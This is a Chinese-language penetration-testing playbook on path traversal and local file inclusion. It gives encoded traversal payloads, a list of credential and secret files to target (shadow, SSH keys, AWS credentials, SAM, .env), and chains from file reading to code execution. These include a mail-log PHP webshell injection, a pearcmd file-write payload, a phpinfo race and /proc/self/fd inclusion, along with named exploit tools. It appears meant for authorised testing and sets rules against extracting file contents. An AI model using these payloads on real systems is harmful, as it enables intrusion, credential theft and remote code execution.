---
id: path-traversal
title: 路径穿越/任意文件读取手册（编码绕过/filter 流/归档）
tags: lfi,穿越,文件读取,phpfilter,归档,s4
---
# 路径穿越手册

> 判据=可控路径读取到**已知内容的公开文件**（存在性证明）；敏感文件只证可达（长度/哈希前缀），不外带内容。利用级（写文件/RCE 链）转 S5。

## 一、探针链

```bash
# 基础：?file=../../../../etc/passwd → /etc/hostname → /var/log/ 下公开样例
# Windows：..\..\..\windows\win.ini  /  C:\Windows\System32\drivers\etc\hosts
# 绝对路径混用：?file=/etc/passwd（服务端拼接行为差异）
# 编码层：%2e%2e%2f  %252e%2e%252e%2f  ..%252f  %c0%ae（宽字节栈年代）
# 归档类：zip 符号链接打包（symlink 指向 /etc/passwd）→ 解压类功能读取（仅公开文件）
```

## 二、读文件 → 代码执行的候选链（确认后转 S5）

- **PHP filter 流**：`php://filter/read=convert.base64-encode/resource=index` 读源码判据 → 源码中反序列化入口/include 变量 → 联动 php-family。
- **日志回写**：日志/UA 回显位 + LFI include → 二次包含判据（RCE 候选，S5）。
- **session/上传临时文件**：路径可猜测（LFI→包含 session 判据，S5）。
- Java：`/WEB-INF/web.xml` 读 → class 路径推断；Spring boot `file:///proc/self/environ`（只取存在性）。

## 三、上下文差异

- 下载类（attachment）vs 渲染类（include）：前者泄露，后者可 RCE 候选——分别登记。
- 影响定级按可读目录范围：仅 uploads 目录（低）→ 全文件系统（高，cwe-22/cwe-98）。

## 四、纪律

- 读到的敏感内容**只记哈希/长度/存在性**入证据（红线 3）；证据文件内禁止粘贴敏感文件正文。
- 批量遍历目录树禁止（限速单请求验证；深度假设走 hypothesis-0day）。

### 敏感文件清单与高级技巧

Linux 清单：`/etc/shadow`、`/proc/self/cmdline`、`/proc/[pid]/maps`、`/var/mail/www-data`、`/home/USER/.ssh/id_rsa`、`/home/USER/.aws/credentials`、`.bash_history`、`/var/www/html/.env`、`wp-config.php`、`/etc/nginx/sites-enabled/`。Windows 清单：`C:\Windows\System32\config\SAM`、`C:\inetpub\wwwroot\web.config`、`C:\ProgramData\MySQL\MySQL Server 8\my.ini`、UNC `\\127.0.0.1\C$\Windows\win.ini`。编码增补：`..%c1%9c`（overlong 反斜杠）、`..%ef%bc%8f`（全角斜杠）、`....//`、`..././`（剥离型）。PHP 路径截断：`?page=../../../../etc/passwd/./././././...`（255+ 字符丢追加 .php）。/proc/self/fd 爆破：`/proc/self/fd/0`~`255` 逐个 include（上传路径未知时赶在清理前）。Mail log 污染：SMTP `Subject: <?php system($_GET[c]); ?>` → include `/var/log/mail.log`。phpinfo 竞态：multipart 传 phpinfo → 读 `tmp_name`(/tmp/phpXXXXXX) → 竞态 include（窗口 ~10ms）。filter 工具三件套：php_filter_chain_generator、synacktiv/php_filter_chains_oracle_exploit（dechunk 盲读逐字节）、ambionics/wrapwrap（加前后缀→把文件读转 XXE/SSRF/反序列化）。PEARCMD 四法（Docker PHP 镜像+register_argc_argv=On）：`/?file=pearcmd.php&+config-create+/<?=phpinfo()?>+/tmp/x.php`、download 法、install 法。Windows FindFirstFile：`include("php<<")` 匹配任意 .php*；`shel>` 匹配 shell.php。高频参数/端点表：`hdfile/inputFile/XFileName/FileUrl/docPath`；端点 `down.php/download.jsp/getfile.php/readfile.php/view.php`；RFI 判据 `allow_url_include=On`。